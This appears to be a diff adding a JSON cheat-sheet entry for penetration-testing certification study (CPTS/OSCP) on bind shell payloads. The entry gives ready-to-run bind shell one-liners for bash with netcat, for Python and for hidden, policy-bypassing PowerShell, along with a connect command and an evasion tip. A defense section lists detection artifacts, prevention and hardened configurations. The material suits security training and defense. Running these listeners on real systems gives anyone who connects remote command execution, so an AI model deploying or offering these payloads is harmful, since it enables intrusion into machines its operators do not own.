@@ -1,0 +1,91 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "bash",
+    "python",
+    "powershell"
+  ],
+  "tags": [
+    "bind-shell",
+    "payload"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Shells & Payloads",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 02: Getting Started",
+  "examples": [
+    {
+      "label": "Connect in from your box",
+      "command": "nc 10.10.10.1 1234"
+    }
+  ],
+  "notes": "Bind shells listen on the target; you connect to them. Useful when the target has no outbound connectivity but has an open inbound port. Requires firewall/NAT to allow the chosen port. Less common than reverse shells in real engagements.",
+  "references": [
+    {
+      "title": "Bind Shell Cheatsheet",
+      "url": "https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/"
+    },
+    {
+      "title": "HTB Academy - Getting Started",
+      "url": "https://academy.hackthebox.com/module/details/77"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gs-tty-upgrade",
+      "rel": "next",
+      "note": "Stabilize after connecting."
+    }
+  ],
+  "id": "gs-bind-shells",
+  "name": "Bind Shell Payloads",
+  "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <port> >/tmp/f",
+  "description": "Run on the target to open a listener there; you connect in. Useful when the target can't reach back out, but requires an inbound-allowed port.",
+  "variations": [
+    {
+      "label": "Linux bash",
+      "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f"
+    },
+    {
+      "label": "Python",
+      "command": "python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"
+    },
+    {
+      "label": "Windows PowerShell",
+      "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Adversaries abuse built-in command and scripting interpreters present on virtually all operating systems. Because these are legitimate system tools, their use is difficult to distinguish from normal administration — providing a low-noise execution path for running malicious commands or payloads.",
+    "prerequisites": "Code execution on the target to launch a listener, and the bound port reachable through the firewall.",
+    "impact": "An interactive command shell on the target, reachable by the attacker connecting inbound.",
+    "detection": "Monitor for execution of scripting or command interpreters outside expected administrative time windows, from unusual user contexts, or with encoded/obfuscated arguments. Secondary execution events spawned from interpreters (e.g., a shell spawning another shell or a network tool) are particularly significant.",
+    "artifacts": "A listening port opened by an unusual process; an inbound connection to that port; an interpreter (bash/nc/powershell) spawned with listener arguments.",
+    "prevention": "Use antivirus/antimalware to automatically quarantine suspicious scripts. Employ application control to restrict which scripts and interpreters can execute. Monitor and restrict the execution of interpreters (bash, sh, python, etc.) where not explicitly required.",
+    "evasion": "Bind the listener to a common-looking port and encode the payload; a bind shell is inherently more exposed than a reverse shell because its listening port is visible, so an unremarkable, reachable port is preferred.",
+    "sources": [
+      "MITRE T1059"
+    ],
+    "misconfiguration": "Outbound connections from servers are not filtered — any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
+    "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows — PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
+    "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows — PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
+  }
+}
